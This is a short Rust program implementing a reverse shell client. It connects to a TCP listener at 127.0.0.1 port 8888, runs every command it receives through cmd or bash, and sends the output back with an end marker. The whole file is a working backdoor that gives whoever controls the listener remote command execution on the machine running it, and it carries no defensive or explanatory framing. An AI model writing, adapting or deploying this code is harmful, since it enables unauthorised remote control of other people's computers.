use std::io::{Read, Write};
use std::net::TcpStream;
use std::process::Command;

const DELIMITER: &str = "<EOF>";

fn execute_command(command: &str) -> String {
    let os_type = std::env::consts::OS;

    let output = if os_type == "windows" {
        Command::new("cmd")
            .arg("/C")
            .arg(command)
            .output()
    } else {
        Command::new("bash")
            .arg("-c")
            .arg(command)
            .output()
    };

    match output {
        Ok(output) => {
            if output.status.success() {
                String::from_utf8_lossy(&output.stdout).to_string()
            } else {
                format!("Error: {}", String::from_utf8_lossy(&output.stderr))
            }
        }
        Err(err) => format!("Error executing command: {}", err),
    }
}

fn start_client() {
    let host = "127.0.0.1";
    let port = 8888;

    if let Ok(mut client_socket) = TcpStream::connect((host, port)) {
        loop {
            let mut buffer = [0; 1024];
            let bytes_received = client_socket.read(&mut buffer).expect("Failed to read command");

            if bytes_received == 0 {
                break;
            }

            let command = String::from_utf8_lossy(&buffer[..bytes_received]);
            let command = command.trim();

            println!("[*] Received command: {}", command);

            let output = execute_command(command);
            println!("command outpu was: {}", output);
            // Send the output with the delimiter
            let response = format!("{}{}", output, DELIMITER);
            client_socket.write_all(response.as_bytes()).expect("Failed to send output");
        }
    }
}

fn main() {
    start_client();
}
